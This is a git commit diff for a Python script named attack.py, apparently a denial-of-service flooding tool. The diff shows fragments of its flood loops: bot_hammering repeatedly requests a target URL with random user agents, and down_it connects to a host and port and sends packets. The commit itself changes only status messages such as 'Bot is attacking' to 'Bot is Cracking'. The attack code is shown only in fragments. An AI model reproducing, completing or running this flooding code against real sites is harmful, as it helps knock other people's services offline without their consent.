0625810942ad09242f04c9ee14db910ca9f256d2
Henrycko <49187820+thetermuxchoice@users.noreply.github.com>
2019-04-16 10:08:31 +0700

    Update attack.py

--- attack.py
+++ attack.py
@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mBot is attacking\033[0m")
+			print("\033[94mBot is Cracking\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,7 +49,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Packet sent! brute attack--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94mPacket sent! brute attack\033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
